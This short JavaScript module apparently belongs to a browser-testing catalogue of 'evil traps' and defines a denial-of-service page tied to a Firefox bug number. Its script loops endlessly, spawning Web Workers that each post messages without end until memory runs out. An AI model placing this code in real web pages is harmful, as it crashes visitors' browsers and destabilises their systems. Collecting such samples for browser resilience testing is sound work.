const EvilTrap = require('../../EvilTrap');

module.exports = new EvilTrap('postMessage DoS', EvilTrap.CATEGORY.DOS, 'High amounts of postMessage calls lead to memory exhaustion and may cause system instability.', { firefox: '1543318' })
  .addScriptPage(() => {
    const blob = new Blob(['self.onmessage = function(event) {  while(true){postMessage(1); } }'], { type: 'application/javascript' });
    // eslint-disable-next-line no-constant-condition
    while (true) {
      new Worker(URL.createObjectURL(blob)).postMessage('go');
    }
  });
